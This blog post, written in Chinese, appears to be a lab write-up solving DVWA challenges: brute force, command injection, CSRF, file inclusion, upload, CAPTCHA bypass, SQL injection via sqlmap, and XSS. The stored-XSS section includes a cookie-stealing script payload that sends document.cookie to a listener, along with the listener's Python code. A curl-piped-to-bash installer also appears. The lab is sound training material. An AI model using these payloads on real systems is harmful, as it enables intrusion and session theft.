---
icon: pen-to-square
date: 2025-03-14
tags: 
title: DVWA
category:
  - 项目
---
# 前言
## **set up**
```bash
Downloading DVWA from GitHub...
Cloning into '/var/www/html/DVWA'...
remote: Enumerating objects: 5105, done.
remote: Counting objects: 100% (91/91), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 5105 (delta 79), reused 67 (delta 67), pack-reused 5014 (from 4)
Receiving objects: 100% (5105/5105), 2.49 MiB | 2.08 MiB/s, done.
Resolving deltas: 100% (2489/2489), done.
MariaDB service is already enabled.
MariaDB service is already running.

Default credentials:
Username: root

Password: [No password just hit Enter]
Enter SQL user: root
Enter SQL password (press Enter for no password):
SQL commands executed successfully.
Configuring DVWA...
Configuring permissions...
Configuring PHP...
Apache service is already enabled.
Restarting Apache...
DVWA has been installed successfully. Access http://localhost/DVWA to get started.
Credentials:
Username: admin
Password: password

With ♡ by IamCarron
root@ubantuu:~# ls
mc  path  vulhub
root@ubantuu:~#

```
docker共享文件夹
```bash
sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
```

---
## brute Force
### low
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193624.png)
这题可以字典攻击
用集群炸弹攻击，会遍历所有排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193938.png)
如果用pitchfork攻击，是这样的排列，按照字典的排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194133.png)
简单列表就很奇怪了，只会插入一个payload位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194626.png)
碰撞攻击会为每一个payload使用同一个字典
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194822.png)


然后构造字典，实际情况会更复杂，花费的时间也更多
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194045.png)

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194441.png)
成功的组合长度是不同的
还有sql注入的方面也可以攻破此关
```sql
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```
源码的sql逻辑很简单，我们只需要
构建这样的payload即可通过
`user;` admin' or '1='1

---
### Medium
中等难度会睡两秒钟然后再继续进行
并且添加了简单的防sql注入的代码
```php
$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
```
- `((isset($GLOBALS["___mysqli_ston"])`:检查全局变量 `$GLOBALS` 中是否存在名为 `___mysqli_ston` 的键。
-  `is_object($GLOBALS["___mysqli_ston"])`作用：验证 `$GLOBALS["___mysqli_ston"]` 是否为对象。确保数据库连接是一个有效的 `mysqli` 对象（而非字符串、数组等）。
 **`mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user)`**

- **作用**：对字符串 `$user` 进行转义，使其安全嵌入SQL语句。
- **参数**：
    - `$GLOBALS["___mysqli_ston"]`：数据库连接对象。
    - `$user`：待转义的原始输入（如用户提交的用户名）。
- **返回值**：转义后的安全字符串（如 `O\'Brien` 转义为 `O\\\'Brien`）。
- #### **`trigger_error(message, E_USER_ERROR)`**
- **作用**：主动触发一个用户级别的致命错误（Fatal Error）。说明数据库连接无效
?代表前边的两个条件双与条件，:代表成立会指向:前面的语句，不成立会执行后面的语句
再爆破一下即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319153958.png)

---
### High
发现在构造的数据包出现了`user_token`字段
然后进行重传，发现不能够进行重传，返回302
在传回的http中发现了隐藏value字段很像token
- 在服务端会生成session，发送到客户端，然后客户端在进行操作时需要携带session，这种处理方式可以抵御重放攻击
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319160137.png)
那么，我们在intruder设置一下
先设置pitchfork攻击
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319160952.png)
然后设置第三个注入点
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319161123.png)
设置检索提取，并键入规则：从`value='`之后`'`之前进行匹配
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319161213.png)
然后设置首次初始payload为刚才设置提取的返回的vlaue即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319161549.png)
设置重定向为总是，在每次收到token时会更新
然后分别为字段1和2设置爆破字典列表
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319162201.png)
成功！

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319162045.png)

---

## Command Injection
### low
& ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行  
- 似乎会同时执行两个命令
&&：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行  
- 等待前一个命令执行后才会执行下一个命令
|：前面一个命令无论是否执行，后面的命令都能执行且    **只执行后面一个**  

||：前面一个命令不能正常执行后，才能执行后面一个命令

；:跟&&的原理差不多
看看源码
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314200721.png)
可以发现会将"ping"直接拼接到我们的"地址"上
我们可以利用这个进行上面的命令拼接符进行攻击，执行危险操作

---
### Medium
```php
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
```
简单的过滤了一些命令分隔符
```php
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
会将$target中的与`substitutions`键的匹配的内容替换为值的内容
不过没有过滤`|`和`||``&`等
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319164020.png)

---
### High
```php
    $substitutions = array(
        '||' => '',
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );
```
这关过滤了几乎所有的命令分隔符
但是发现`| `有一个空格，那么我们直接用|进行请求即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319164550.png)

---
## CSRF（跨站请求伪造）
### low
```php
$pass = $_GET[ 'password' ];
```

这是一切问题的根源，这段代码说明了包含修改密码的请求包可以在url中集成，意味着攻击者可以通过这个url构建一个按钮，访问这个页面，在不知不觉中造成密码更改
```url
http://192.168.254.128/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#
```


---
### Medium
```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
```
这个函数会检查http请求头的refer字段是否为服务器的名字，我们只需要在bp中加入对应的refer字段即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319171143.png)

---
### High
```php
if ($change) {
    // Check Anti-CSRF token
    checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );
```
会检查cookie是否正确
我们需要再每次构建url时把新的token传入
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319174320.png)


---
## File Inclusion
### low
文件包含漏洞，可移植性任意文件，包括服务器本地文件和远程文件
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>


```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314204935.png)
没有对文件做过滤并且会返回文件路径，
```
192.168.254.128/DVWA/vulnerabilities/fi/?page=http://127.0.0.1/DVWA/phpinfo.php
```

---

### Medium
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?>
```
`str_replace( array( "http://", "https://" ), "", $file );`:这个函数会将htt://p和https://替换为空格，遇到这类的替换函数我们可以用双写绕过
```url
http://192.168.254.128/DVWA/vulnerabilities/fi/?page=htthttp://p://192.168.254.128/DVWA/login.php
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319215554.png)


---
### High
```php
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
```
在输入的参数存在file开头的语句时，会返回true，否则为false，同时，检测到file不为include.php时为true
尝试包含ma.php
```
**Warning**: include(file:///root/ma.php): Failed to open stream: Permission denied in **/var/www/html/DVWA/vulnerabilities/fi/index.php** on line **36**  
  
**Warning**: include(): Failed opening 'file:///root/ma.php' for inclusion (include_path='.:/usr/share/php') in **/var/www/html/DVWA/vulnerabilities/fi/index.php** on line **36**
```
发现没有权限(笑)
`chmod +x ...`一路绿灯终于成功
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319222121.png)


---

## File upload

### low
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```
没有过滤文件类型，直接上传即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320170315.png)

---
### Medium
```php
 if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
```
这个会检查MIME头
然后一切跟上题一样

---
### High
```php
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {
```
getimagesize：必须得是图片内容
添加了白名单验证，但是发现关于$uploaded_ext具有漏洞
```php
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
```
strrpos()会查找最后一个`.`的位置，并返回索引
substr()会根据后面的索引分离这个索引+1以及(包括+1索引)以后的内容
这关比较安全，只能制作图片马然后上传jpg格式的内容

---

## Insecure CAPTCHA
### Low
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
看代码,这些是step1的内容
```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    $hide_form = true; // 隐藏表单，仅显示后续内容
    $pass_new  = $_POST[ 'password_new' ];  // 获取新密码
    $pass_conf = $_POST[ 'password_conf' ]; // 获取确认密码

    // 调用第三方CAPTCHA验证接口
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'], // 从配置获取私钥
        $_POST['g-recaptcha-response']    // 用户提交的CAPTCHA响应
    );

    if( !$resp ) { // CAPTCHA验证失败
        $html .= "<pre>CAPTCHA错误，请重试。</pre>";
        $hide_form = false; // 重新显示表单
        return; // 终止后续逻辑
    } else { // CAPTCHA验证成功
        if( $pass_new == $pass_conf ) { // 检查密码是否一致
            // 生成确认表单（跳转Step 2）
            echo "
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"确认修改\" />
                </form>";
        } else { // 密码不一致
            $html .= "<pre>密码不匹配。</pre>";
            $hide_form = false;
        }
    }
}
```
逻辑是这样的
检查字段step是否为1，检查CAPTCHA和两次密码相同通过后会再次发送一个step2的html

```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    $hide_form = true; // 隐藏表单
    $pass_new  = $_POST[ 'password_new' ];  // 从隐藏字段获取密码
    $pass_conf = $_POST[ 'password_conf' ]; 

    if( $pass_new == $pass_conf ) { // 再次检查密码一致性
        // 转义密码（防SQL注入）
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) 
            ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass_new) 
            : trigger_error("数据库连接错误", E_USER_ERROR);
        
        $pass_new = md5( $pass_new ); // 使用MD5哈希密码

        // 构造SQL语句更新密码
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert) 
            or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' ); // 错误处理

        echo "<pre>密码修改成功。</pre>";
    } else { // 密码不一致
        echo "<pre>密码不匹配。</pre>";
        $hide_form = false;
    }

    mysqli_close($GLOBALS["___mysqli_ston"]); // 关闭数据库连接
}
```

第二次不检查CAPTCHA之类的信息，直接将密码传入数据库并修改
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319150655.png)
改变这个step即可直接跳过人机验证
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319150741.png)
更改成功

---
### Medium
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
新增的部分
```
// Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }
```
会检查
`passed_captcha`是否被触发，如果为False，则不会通过验证

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250323120713.png)

---
### High
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```


---

## SQL Injection
### Medium
这题在前端限制了我们的输入，但是在bp中可以进行输入
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320204701.png)


1'和1"都报错，判断是无闭合
我们可以直接进行联合注入
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320211303.png)
```sql
1 union select table_name,table_schema from information_schema.tables where table_schema= database()
```
注意select 之后拼接两个字段
跑了超多信息
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320211754.png)

---
### High


![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320212311.png)
这关会重定向另一个界面
```sql
1' union select user,password from users#
```
手动爆
```sql
1' union select user,password from users#
```
sqlmap
```bash
sqlmap -r request.txt  --current-db --batch --second-url="http://192.168.254.128/DVWA/vulnerabilities/sqli/"
```
关键参数--second-url在传入参数后会在指定页面查看回显
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320213602.png)


---
## SQL Injection (Blind)
### Low
^use-sqlmap
先测试正常回显,输入1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315111850.png)
然后输入-1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112001.png)
这里的逻辑
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112027.png)
返回值不为0(不为false)时才会回显exists
那么很好办了，常规的布尔盲注
测试闭合,1'显示miss，1“显示exists，意味着闭合为'
用length(database())试数据库大小，到4时为正确 ^d5e614
```
1' and length(database())=4 #
```
然后使用sqlmap，注意cookie是这个
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315120605.png)
示例命令
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" --current-db
```
注意--cookie的值需要双引号框住[[sql注入#^sqlmap|sqlmap教程]]
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122048.png)
成功爆库名
继续爆库名
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa --tables
```
- `-D`: 指定库名
- 爆表名
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122434.png)
比刚才快很多
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa -T users --dump --batch
```
- --batch:不再询问确认
- --dump：爆数据
- -D dvwa -T users：指定已知数据
还是比较快的
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315123803.png)
成功

---
### Medium
这关只是将get请求变为了POST请求
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250320213948.png)

用类似于非盲注的方式进行攻击即可

---
### Hight
本关和sql注入的此难度相似，还是在另一个页面查看注入的回显

---


## XSS(Reflected)
### Low
反射型xss

XSS漏洞的本质在于弹到网页的用户输入的内容，如果没有过滤用javascript闭合就会造成脚本执行，会造成用户信息泄露等危害
验证是否有XSS的实例
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124529.png)

```html
<script>alert('hack')</script>
```
回显，验证有XSS注入漏洞
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124722.png)
网页代码中的位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315125731.png)


---
### Medium
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?>
```
用简单的过滤，用替换函数将黑名单内容替换为空
我们可以使用双写绕过或者大小写绕过

---
### High
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?>
```
检查name键是否存在，并检查其值是否为空，然后把name中的内容将黑名单的内容替换为空，最后再显示出来
用类似于xss(DOM)中等难度的payload即可
```js
<img src=1 οnerrοr=alert(666)>
```



======

---
## XSS(Stored)
### Low

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        query_params = parse_qs(parsed_path.query)
         # 打印请求信息到控制台
        # print(f"\n[请求路径] {parsed_path.path}")
        # print(f"[查询参数] {json.dumps(query_params, indent=2)}")
        if "cookie" in query_params:
            print(f"已收集到cookie")
            print(f"[Cookie] {query_params['cookie'][0]}"+"\n")
        # print("[请求头]")
        # for header, value in self.headers.items():
        #     print(f"  {header}: {value}")
            # 发送响应
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', '0')
        self.end_headers()
if __name__ == '__main__':
    server_address = ('', 7989)
    httpd = HTTPServer(server_address, RequestHandler)
    print("服务器已启动，监听端口 7989...")
    httpd.serve_forever()
```


写了一个简单的发送脚本
```javascript
<script>   var url = 'http://127.0.0.1:7989?cookie=' + encodeURIComponent(document.cookie);   var xhr = new XMLHttpRequest();   xhr.open('GET', url, true);   xhr.send(); </script>
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250317221248.png)

---
### Medium
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

`strip_tags( addslashes( $message ) );`:函数会将message内容的html标签进行剥离
但是对name的过滤并不严格，只是将`<script>`进行替换，因此，我们可用双写绕过或者大小写绕过

---
### High
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
